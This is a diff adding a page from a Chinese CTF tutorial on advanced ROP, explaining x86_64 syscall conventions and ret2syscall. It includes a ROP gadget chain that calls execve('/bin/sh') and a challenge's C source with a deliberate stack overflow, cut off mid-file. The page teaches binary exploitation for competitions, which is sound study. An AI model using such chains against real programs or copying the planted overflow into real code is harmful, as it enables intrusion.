@@ -1,0 +1,1842 @@
+
+
+
+
+
+<!DOCTYPE html>
+<html lang="zh" dir="ltr">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+    <title>ROP进阶 | Hello CTF</title>
+  
+  <meta name="description" content="开源免费、新手友好的CTF(Capture The Flag,夺旗赛)入门教程">
+  <link rel="icon" href="../../assets/images/favicon.png">
+
+  <!-- 字体（与首页同源） -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Noto+Sans+SC:wght@400;500;700;800&display=swap" rel="stylesheet">
+
+  <!-- material 文章排版 CSS（pin 9.7.7 的 hash 文件名，升级主题时同步更新） -->
+  <link rel="stylesheet" href="../../assets/stylesheets/main.ec1eaa64.min.css">
+  <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+
+  <!-- Hello-CTF 外壳 -->
+  <link rel="stylesheet" href="../../shell/shell.css">
+  <link rel="stylesheet" href="../../shell/shell-docs.css">
+  <link rel="stylesheet" href="../../shell/shell-article.css">
+
+  <!-- 站点原有 extra_css（katex CDN / extra.css / bannerSlider.css 等） -->
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/katex.min.css">
+  
+    <link rel="stylesheet" href="../../stylesheets/extra.css">
+  
+
+  <!-- admonition 等组件的图标 SVG 变量（原由 material base.html 注入） -->
+  
+
+
+
+  
+  
+  
+
+<script id="__analytics">function __md_analytics(){function e(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],e("js",new Date),e("config","G-V9998CDNR1"),document.addEventListener("DOMContentLoaded",(function(){document.forms.search&&document.forms.search.query.addEventListener("blur",(function(){this.value&&e("event","search",{search_term:this.value})}));document$.subscribe((function(){var t=document.forms.feedback;if(void 0!==t)for(var a of t.querySelectorAll("[type=submit]"))a.addEventListener("click",(function(a){a.preventDefault();var n=document.location.pathname,d=this.getAttribute("data-md-value");e("event","feedback",{page:n,data:d}),t.firstElementChild.disabled=!0;var r=t.querySelector(".md-feedback__note [data-md-value='"+d+"']");r&&(r.hidden=!1)})),t.hidden=!1})),location$.subscribe((function(t){e("config","G-V9998CDNR1",{page_path:t.pathname})}))}));var t=document.createElement("script");t.async=!0,t.src="https://www.googletagmanager.com/gtag/js?id=G-V9998CDNR1",document.getElementById("__analytics").insertAdjacentElement("afterEnd",t)}</script>
+</head>
+<body data-md-color-scheme="default">
+
+  <!-- 主题初始化（先于渲染，避免闪烁）：hc-theme → shell data-theme + material slate -->
+  <script>
+    (function () {
+      var t = null;
+      try { t = localStorage.getItem("hc-theme"); } catch (e) {}
+      if (t) {
+        document.documentElement.dataset.theme = t;
+        document.body.setAttribute("data-md-color-scheme", t === "dark" ? "slate" : "default");
+      }
+    })();
+    window.__md_palette_sync = function (t) {
+      document.body.setAttribute("data-md-color-scheme", t === "dark" ? "slate" : "default");
+    };
+  </script>
+
+  <script src="../../shell/search.js"></script>
+  <script src="../../shell/shell.js"></script>
+  <script>Shell.mount({ active: "" });</script>
+
+  <!-- 主区：顶部文档导航 + 文章 + TOC -->
+  <div class="main">
+    <nav class="hc-topnav" aria-label="文档导航">
+      <div class="hc-topnav-inner">
+        
+          
+          
+            <a class="tn-item tn-single" href="../../hc-start/"><svg class="ic tn-ico"><use href="#i-book"/></svg>快速开始</a>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-book"/></svg>前言<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-preface/">前言</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-preface/about/">关于本书</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-preface/usage/">食用方法</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-preface/join/">加入我们</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-wrench"/></svg>环境<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-env/">环境配置</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-env/CTFtool/">工具一览</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-env/Docker_On_Linux/">Docker环境</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-env/Crypto/">Crypto环境设置</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-puzzle"/></svg>MISC<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-misc/">MISC | 杂项</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/osint/">信息收集</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/Encode_extra/">编码扩展</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/file/">文件基础</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/Archivefile/">压缩包</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/stego/">图片隐写</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/file_stego/">文件隐写</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/audio_stego/">音频隐写</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/pcap/">流量分析</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/industrial/">工控类</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/memory/">内存取证</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/file_sign/">附:文件签名表</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-globe"/></svg>Web<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-web/">Web | 网络攻防</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-web/web_start/">Web入门题单</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-web/sensitive_info/">敏感信息泄露</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-web/php_basic/">PHP基础</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-web/php_unser_base/">PHP反序列化基础</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-web/sql_injection/">SQL注入</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-web/xss/">XSS攻击</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-web/include/">文件包含</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-web/ssti/">SSTI注入</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-web/xxe/">XXE注入</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-web/ssrf/">SSRF注入</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-web/php_code_audit/">PHP 代码审计</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-web/rce/">RCE</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-web/file_upload/">文件上传</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-web/dir_traversal/">目录穿越</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-web/logical_vuln/">逻辑漏洞</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-web/any_file_read/">任意文件读取</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-lock"/></svg>Crypto<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-crypto/">Crypto | 密码学</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-crypto/Recap/">前情提要</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-crypto/Encode/">编码基础</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-crypto/Classicalcipher/">古典密码</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-crypto/Moderncipher/">现代密码</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-cpu"/></svg>Reverse<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-reverse/">逆向工程</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%BC%95%E5%AF%BC%E7%AF%87%EF%BC%9A%E7%81%B5%E9%AD%82FAQ/">引导篇：灵魂FAQ</a>
+    
+  
+    
+      <div class="tn-group">编译与可执行文件</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-reverse/C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/">C语言基础</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%AD%98%E5%82%A8%E7%BB%93%E6%9E%84/">存储结构</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/Quick%20Start%EF%BC%9A%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6/">可执行文件</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">交互式反汇编工具IDA</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-reverse/StartWithIDA/">从零开始的IDA</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/IDA%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/">IDA动态调试</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">常见算法</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%9F%BA%E6%9C%AC%E8%BF%90%E7%AE%97/">基本运算</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E7%BC%96%E7%A0%81%E5%9F%BA%E7%A1%80/">编码基础</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%AD%97%E8%8A%82%E6%B5%81%E7%AE%97%E6%B3%95/">字节流算法</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81/">分组密码</a>
+    
+  
+
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/z3%E7%BA%A6%E6%9D%9F%E6%B1%82%E8%A7%A3/">z3约束求解</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/Quick%20Start%EF%BC%9AASM%E6%B1%87%E7%BC%96/">x86 汇编初步</a>
+    
+  
+    
+      <div class="tn-group">代码保护与对抗</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E8%8A%B1%E6%8C%87%E4%BB%A4/">花指令</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84%E5%A3%B3/">加壳</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/VM/">VM</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/SMC/">SMC</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/">异常处理</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%A4%9A%E7%BA%BF%E7%A8%8B/">多线程</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/TLS%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0/">TLS回调函数</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%8F%8D%E8%B0%83%E8%AF%95/">反调试</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E6%8E%A7%E5%88%B6%E6%B5%81%E5%B9%B3%E5%9D%A6%E5%8C%96/">控制流平坦化</a>
+    
+  
+
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/">符号执行</a>
+    
+  
+    
+      <div class="tn-group">语言与框架</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-reverse/Python/">Python</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/NET/">.NET</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/Rust/">Rust</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/JavaScript/">JavaScript</a>
+    
+  
+
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/Android/">Android平台</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E8%A7%A3%E9%A2%98%E6%8A%80%E5%B7%A7/">解题技巧</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item on">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-terminal"/></svg>Pwn<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../">Pwn | 二进制安全</a>
+    
+  
+    
+      <a class="tn-link" href="../wsl2_environment/">wsl2下的环境配置</a>
+    
+  
+    
+      <a class="tn-link" href="../Asm_x86/">汇编语言(x86)</a>
+    
+  
+    
+      <a class="tn-link" href="../Stack_Overflow/">栈上数组越界&栈溢出</a>
+    
+  
+    
+      <a class="tn-link" href="../ROP/">ROP入门</a>
+    
+  
+    
+      <a class="tn-link" href="../ROP_Tricks/">常见的ROP技巧</a>
+    
+  
+    
+      <a class="tn-link on" href="./">ROP进阶</a>
+    
+  
+    
+      <a class="tn-link" href="../Protections/">常见保护</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-shield"/></svg>AWD<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-awd/awd_about/">AWD介绍</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-awd/awd_platform/">AWD平台</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-awd/awd_web.exp/">【WEB】AWD技巧</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-awd/awd_pwn.exp/">【PWN】AWD技巧</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-bot"/></svg>AI<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-ai/">AI | 人工智能</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-ai/What_is_AI/">初识AI</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-ai/MLP/">你的第一个神经网络</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-link"/></svg>区块链<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <div class="tn-group">Move</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-blockchain/Move/0x00/">从0开始的签到题</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-blockchain/Move/0x01/">独特的所有权</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-blockchain/Move/0x02/">神奇的时钟</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-blockchain/Move/0x03/">对象与燃气</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-blockchain/Move/0x04/">多样的泛型</a>
+    
+  
+
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-tag"/></svg>附录<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-appendix/how-to-ask/">提问的智慧</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-appendix/CTFevent/">CTF赛事</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-appendix/NSSCTF_Usage/">NSSCTF平台使用</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-appendix/book/">推荐书单</a>
+    
+  
+</div>
+            </div>
+          
+        
+      </div>
+    </nav>
+    <div class="doc-layout">
+      <article class="md-typeset hc-article">
+        <!-- Tags -->
+
+
+<!-- Actions -->
+<!-- Actions -->
+
+
+  <!-- Edit button -->
+  
+
+  <!-- View button -->
+  
+
+
+<!-- Page content -->
+<div><h1 id="rop">ROP 技巧补坑<a class="headerlink" href="#rop" title="Permanent link">¶</a></h1>
+<p>本节作者:EROORvbsyes</p>
+<h2 id="_1">前言<a class="headerlink" href="#_1" title="Permanent link">¶</a></h2>
+<p>前面我们讲了不少 <code>ret2xxx</code> 系列，但是把 <code>ret2syscall</code> 漏掉了。<br>
+这篇就先把这个坑补上，顺手把 <code>ret2csu</code> 和 <code>SROP</code> 也带一下。</p>
+<p>另外这次的 blog 是我用手机写的，所以图会比较少，基本可以当成纯文字笔记看。</p>
+<blockquote>
+<p>说明：本文默认讨论 <strong>x86_64 Linux</strong> 场景。<br>
+如果是 32 位程序、其他架构，或者题目开了额外限制，那么系统调用号、寄存器约定和 gadget 写法都要重新确认。</p>
+</blockquote>
+<h2 id="ret2syscall">ret2syscall<a class="headerlink" href="#ret2syscall" title="Permanent link">¶</a></h2>
+<h3 id="_2">基本原理<a class="headerlink" href="#_2" title="Permanent link">¶</a></h3>
+<p>程序和内核交互要靠系统调用，可以粗略理解成：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="n">SYSCALL</span><span class="p">(</span><span class="n">syscall_id</span><span class="p">,</span><span class="w"> </span><span class="n">arg1</span><span class="p">,</span><span class="w"> </span><span class="n">arg2</span><span class="p">,</span><span class="w"> </span><span class="p">...);</span>
+</code></pre></div>
+<p>系统调用本质上是内核暴露给用户态程序的接口。像文件读写、网络通信、进程控制这类操作，最后都要落到系统调用上。</p>
+<p>不同架构发起系统调用的方式不同：</p>
+<ul>
+<li>32 位 Linux 常见是 <code>int 0x80</code></li>
+<li>64 位 Linux 常见是 <code>syscall</code></li>
+</ul>
+<p>在 <strong>x86_64 Linux</strong> 下，常见的系统调用约定是：</p>
+<ul>
+<li><code>rax</code>：系统调用号</li>
+<li><code>rdi</code>、<code>rsi</code>、<code>rdx</code>、<code>r10</code>、<code>r8</code>、<code>r9</code>：前 6 个参数</li>
+<li>返回值放回 <code>rax</code></li>
+</ul>
+<blockquote>
+<p>这里要区分清楚“函数调用约定”和“系统调用约定”。<br>
+例如普通的 System V AMD64 调用约定里第 4 个参数常走 <code>rcx</code>，但 <code>syscall</code> 这里通常要放到 <code>r10</code>。</p>
+</blockquote>
+<p>系统调用进入内核态后，可能很快返回，也可能发生阻塞。<br>
+它的额外开销主要来自用户态和内核态之间的切换，而不是“所有系统调用都一定特别慢”。</p>
+<h3 id="read">一个简单的 <code>read</code> 例子<a class="headerlink" href="#read" title="Permanent link">¶</a></h3>
+<p><code>read</code> 本身就是系统调用，<code>libc</code> 里的 <code>read</code> 只是对它的一层封装。<br>
+为了方便说明，这里直接假设缓冲区地址已经准备好了：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="nf">mov</span><span class="w"> </span><span class="no">rdi</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="w">      </span><span class="c1">; fd = 0, stdin</span>
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="nf">mov</span><span class="w"> </span><span class="no">rsi</span><span class="p">,</span><span class="w"> </span><span class="no">buf</span><span class="w">    </span><span class="c1">; buf</span>
+<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="nf">mov</span><span class="w"> </span><span class="no">rdx</span><span class="p">,</span><span class="w"> </span><span class="mi">64</span><span class="w">     </span><span class="c1">; count</span>
+<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="nf">mov</span><span class="w"> </span><span class="no">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="w">      </span><span class="c1">; __NR_read</span>
+<a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="nf">syscall</span>
+</code></pre></div>
+<p>这段代码等价于：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="mi">64</span><span class="p">);</span>
+</code></pre></div>
+<p>如果系统调用失败，错误通常会体现在 <code>rax</code> 返回负值，而不是“程序自动停住”。</p>
+<h3 id="rop_1">在 ROP 里怎么用<a class="headerlink" href="#rop_1" title="Permanent link">¶</a></h3>
+<p><code>ret2syscall</code> 的核心思路是：当我们拿不到 <code>libc</code> 地址，或者题目本来就是想考系统调用时，直接布置好寄存器，然后执行 <code>syscall</code> gadget。</p>
+<p>在 x86_64 Linux 下，如果我们想执行：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="n">execve</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span>
+</code></pre></div>
+<p>那么需要满足：</p>
+<ul>
+<li><code>rax = 59</code></li>
+<li><code>rdi = "/bin/sh"</code> 的地址</li>
+<li><code>rsi = 0</code></li>
+<li><code>rdx = 0</code></li>
+</ul>
+<p>对应的 ROP 链可以写成：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>pop rdi ; ret
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>bin_sh_addr
+<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>xor rsi, rsi ; ret
+<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>xor rdx, rdx ; ret
+<a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>pop rax ; ret
+<a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>59
+<a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a>syscall ; ret
+</code></pre></div>
+<p>如果没有 <code>xor rsi, rsi ; ret</code> 或 <code>xor rdx, rdx ; ret</code> 这类 gadget，也可以改成 <code>pop rsi ; ret</code>、<code>pop rdx ; ret</code> 再传 <code>0</code>。</p>
+<p>这样做的好处是：</p>
+<ul>
+<li>不依赖 <code>system</code> 或 <code>execve</code> 的 <code>libc</code> 地址</li>
+<li>很适合没有 libc 泄露、但有足够 syscall/gadget 的题</li>
+<li>常见用途包括拿 shell、做 ORW（<code>open</code> / <code>read</code> / <code>write</code>）等</li>
+</ul>
+<blockquote>
+<p><code>ret2syscall</code> 并不等于“一定不会出错”。<br>
+你仍然要确认：</p>
+<ul>
+<li>架构和系统调用号是否匹配</li>
+<li>gadget 是否真的以 <code>ret</code> 结束</li>
+<li>指针是否可访问</li>
+<li>当前链条是否满足栈和寄存器约束</li>
+</ul>
+</blockquote>
+<h3 id="_3">调试时要注意什么<a class="headerlink" href="#_3" title="Permanent link">¶</a></h3>
+<p>最容易混淆的点，不是“内核版本差一点就完全不能用”，而是下面这些：</p>
+<ul>
+<li><strong>架构不同</strong>：32 位和 64 位的系统调用号、寄存器约定都不同</li>
+<li><strong>ABI 不同</strong>：别把普通函数调用约定和 <code>syscall</code> 约定混在一起</li>
+<li><strong>返回值判错</strong>：系统调用失败时，通常是 <code>rax</code> 返回错误码，而不是直接崩溃</li>
+<li><strong>安全机制限制</strong>：有些题会开 <code>seccomp</code>，这时不是链子写错，而是系统调用本身被过滤了</li>
+</ul>
+<h3 id="_4">总结补充<a class="headerlink" href="#_4" title="Permanent link">¶</a></h3>
+<blockquote>
+<p>当题目是x86_32的时候就不能用syscall了，此时要用<code>int 0x80</code>来进行系统调用，但还是使用eax传递调用号,edi,esi,edx等寄存器分别传递参数。
+若开启 seccomp，需先用 seccomp-tools dump 查看允许的系统调用，必要时改用 open/read/write 组合（ORW）。</p>
+</blockquote>
+<h3 id="_5">具体题目<a class="headerlink" href="#_5" title="Permanent link">¶</a></h3>
+<h4 id="_6">分析<a class="headerlink" href="#_6" title="Permanent link">¶</a></h4>
+<p>这个题目给出了源文件，我们直接看：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="cp">#include</span><span class="cpf">&lt;stdlib.h&gt;</span>
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="cp">#include</span><span class="cpf">&lt;stdio.h&gt;</span>
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="cp">#include</span><span class="cpf">&lt;unistd.h&gt;</span>
+<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="cp">#include</span><span class="cpf">&lt;string.h&gt;</span>
+<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="kt">char</span><span class="w"> </span><span class="n">binsh</span><span class="p">[]</span><span class="o">=</span><span class="s">"/bin/sh"</span><span class="p">;</span>
+<a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a><span class="kt">int</span><span class="w"> </span><span class="nf">you_can_not_exec</span><span class="p">(){</span>
+<a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a><span class="w">    </span><span class="k">asm</span><span class="w"> </span><span class="k">volatile</span><span class="w"> </span><span class="p">(</span>
+<a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a><span class="w">        </span><span class="s">"pop rdi;"</span>
+<a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a><span class="w">        </span><span class="s">"ret;"</span>
+<a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a><span class="w">        </span><span class="s">"pop rax;"</span>
+<a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a><span class="w">        </span><span class="s">"ret;"</span>
+<a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a><span class="w">        </span><span class="s">"pop rsi;"</span>
+<a id="__codelineno-5-13" name="__codelineno-5-13" href="#__codelineno-5-13"></a><span class="w">        </span><span class="s">"ret;"</span>
+<a id="__codelineno-5-14" name="__codelineno-5-14" href="#__codelineno-5-14"></a><span class="w">        </span><span class="s">"pop rdx;"</span>
+<a id="__codelineno-5-15" name="__codelineno-5-15" href="#__codelineno-5-15"></a><span class="w">        </span><span class="s">"ret;"</span>
+<a id="__codelineno-5-16" name="__codelineno-5-16" href="#__codelineno-5-16"></a><span class="w">        </span><span class="s">"syscall;"</span>
+<a id="__codelineno-5-17" name="__codelineno-5-17" href="#__codelineno-5-17"></a><span class="w">    </span><span class="p">);</span>
+<a id="__codelineno-5-18" name="__codelineno-5-18" href="#__codelineno-5-18"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<a id="__codelineno-5-19" name="__codelineno-5-19" href="#__codelineno-5-19"></a><span class="p">}</span>
+<a id="__codelineno-5-20" name="__codelineno-5-20" href="#__codelineno-5-20"></a><span class="kt">int</span><span class="w"> </span><span class="nf">vuln</span><span class="p">(){</span>
+<a id="__codelineno-5-21" name="__codelineno-5-21" href="#__codelineno-5-21"></a><span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">vul</span><span class="p">[</span><span class="mh">0x80</span><span class="p">];</span>
+<a id="__codelineno-5-22" name="__codelineno-5-22" href="#__codelineno-5-22"></a><span class="w">    </span><span class="n">memset</span><span class="p">(</span><span class="n">vul</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x80</span><span class="p">);</span>
+<a id="__codelineno-5-23" name="__codelineno-5-23" href="#__codelineno-5-23"></a><span class="w">    </span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">vul</span><span class="p">,</span><span class="mh">0x100</span><span class="p">);</span>
+<a id="__codelineno-5-24" name="__codelineno-5-24" href="#__codelineno-5-24"></a><span class="w">    </span><span class="n">puts</span><span class="p">(</span><span class="n">vul</span><span class="p">);</span>
+<a id="__codelineno-5-25" name="__codelineno-5-25" href="#__codelineno-5-25"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<a id="__codelineno-5-26" name="__codelineno-5-26" href="#__codelineno-5-26"></a><span class="p">}</span>
+<a id="__codelineno-5-27" name="__codelineno-5-27" href="#__codelineno-5-27"></a><span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(){</span>
+<a id="__codelineno-5-28" name="__codelineno-5-28" href="#__codelineno-5-28"></a><span class="w">    </span><span class="n">vuln</span><span class="p">();</span>
